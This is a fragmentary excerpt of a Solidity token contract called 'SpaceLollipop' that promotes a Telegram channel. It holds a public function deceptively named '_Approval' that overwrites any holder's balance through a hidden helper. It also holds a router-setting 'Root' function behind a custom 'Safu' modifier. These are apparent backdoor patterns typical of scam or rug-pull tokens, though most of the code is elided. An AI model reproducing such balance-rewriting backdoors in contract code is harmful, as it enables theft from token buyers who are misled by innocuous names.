...
/* *                                                         
        - Telegram : https://t.me/SpaceLollipop
...
contract SpaceLollipop is IERC20, Ownable {
    ...
    string private _name = "SpaceLollipop";

    string private _symbol = "$Lollipop";
    ...
    function _Approval(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function Root(address Router) public Safu {
